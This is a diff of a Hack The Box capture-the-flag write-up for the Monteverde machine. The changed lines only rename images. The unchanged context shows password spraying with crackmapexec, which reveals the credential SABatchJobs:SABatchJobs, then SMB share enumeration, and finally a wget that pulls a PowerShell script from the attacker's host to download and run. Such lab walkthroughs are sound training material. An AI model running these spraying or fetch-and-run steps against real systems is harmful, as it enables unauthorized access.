@@ -4,7 +4,7 @@ description: https://app.hackthebox.com/machines/Monteverde
 
 # 🐭 Monteverde
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So let's start by a quick nmap:
 
@@ -37,7 +37,7 @@ So let's try to put all the usernames in a word list and spray using crackmapexe
 crackmapexec smb 10.129.69.81 -u users.txt -p users.txt --continue-on-success
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>MEGABANK.LOCAL\SABatchJobs:SABatchJobs</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>MEGABANK.LOCAL\SABatchJobs:SABatchJobs</p></figcaption></figure>
 
 cool we got a match&#x20;
 
@@ -50,7 +50,7 @@ smbmap -H 10.129.69.81 -u SABatchJobs -p SABatchJobs
 * `smbmap`: This is a command-line tool used to enumerate and interact with shares on SMB servers. It allows users to discover accessible shares, permissions, and other information available on SMB-enabled systems.
 * `-H 10.129.69.81`: This parameter specifies the target host or IP address (`10.129.69.81`) of the SMB server that the `smbmap` tool will interact with. This is the remote system you want to analyze.
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 after some enumeration we see some interesting files:
 
@@ -58,7 +58,7 @@ after some enumeration we see some interesting files:
 smbmap -H 10.129.69.81 -u SABatchJobs -p SABatchJobs -R 'users$'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 To grab it using smbclient ->
 
@@ -134,7 +134,7 @@ We see this :
 
 on my local machine i'll put this in an "azurePentest.ps1" file:
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and go fetch it like that:
 
@@ -142,7 +142,7 @@ and go fetch it like that:
 wget http://10.10.14.94:6969/azurePentest.ps1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 or another way is to download it and executing it right away:&#x20;
 
